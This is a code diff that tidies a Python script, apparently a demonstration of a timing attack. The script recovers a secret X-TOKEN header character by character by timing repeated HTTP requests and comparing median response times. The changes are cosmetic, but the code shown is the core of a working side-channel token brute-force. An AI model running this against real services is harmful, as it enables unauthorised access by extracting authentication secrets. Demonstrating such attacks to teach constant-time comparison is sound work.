@@ -25,7 +25,7 @@ def try_to_hack(characters):
     print('.', end='', flush=True)
 
     # Do N HTTP calls
-    for i in range(N):
+    for _ in range(N):
         before = time.perf_counter()
         result = requests.get(URL, headers={'X-TOKEN': characters})
         after = time.perf_counter()
@@ -44,7 +44,7 @@ def find_next_character(base):
     measures = []
 
     print("Trying to find the character at position %s with prefix %r" % ((len(base) + 1), base))
-    for i, character in enumerate(string.ascii_lowercase):
+    for character in string.ascii_lowercase:
         timings = try_to_hack(base + character + "0" * (TOKEN_SIZE - len(base) - 1))
 
         median = statistics.median(timings)
@@ -67,9 +67,9 @@ def find_next_character(base):
     print()
     print("Following characters were:")
 
+    msg ="Character: %r Median: %s Max: %s Min: %s Stddev: %s (%d%% slower)"
     for top_character in top_characters:
         ratio = int((1 - (top_character['median'] / found_character['median'])) * 100)
-        msg ="Character: %r Median: %s Max: %s Min: %s Stddev: %s (%d%% slower)"
         print(msg % (top_character['character'], top_character['median'], top_character['max'], top_character['min'], top_character['stddev'], ratio))
 
     return found_character['character']
